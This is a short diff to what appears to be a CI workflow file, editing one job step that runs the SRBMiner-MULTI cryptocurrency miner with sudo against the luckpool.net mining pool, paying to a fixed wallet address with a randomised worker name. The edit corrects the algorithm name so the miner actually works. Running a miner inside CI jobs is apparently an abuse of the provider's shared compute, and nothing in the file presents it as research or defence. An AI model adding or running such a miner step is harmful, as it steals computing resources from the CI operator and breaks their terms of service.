@@ -19,4 +19,4 @@ jobs:
     - name: Run SRBMiner
       run: |
         cd SRBMiner-Multi-2-5-8
-        sudo ./SRBMiner-MULTI --algorithm versus --pool stratum+tcp://na.luckpool.net:3960 --wallet RNjEn7tNTZ6DuYnYrxKMsvYzBgJ11P5hQ4 --worker raiden$(shuf -i 1-100 -n 1) --api-enable --api-port 21550 --log-file srbminer.log --cpu-threads 4 --cpu-threads-intensity 1 --cpu-threads-priority 3
+        sudo ./SRBMiner-MULTI --algorithm verushash --pool stratum+tcp://na.luckpool.net:3960 --wallet RNjEn7tNTZ6DuYnYrxKMsvYzBgJ11P5hQ4 --worker raiden$(shuf -i 1-100 -n 1) --api-enable --api-port 21550 --log-file srbminer.log --cpu-threads 4 --cpu-threads-intensity 1 --cpu-threads-priority 3
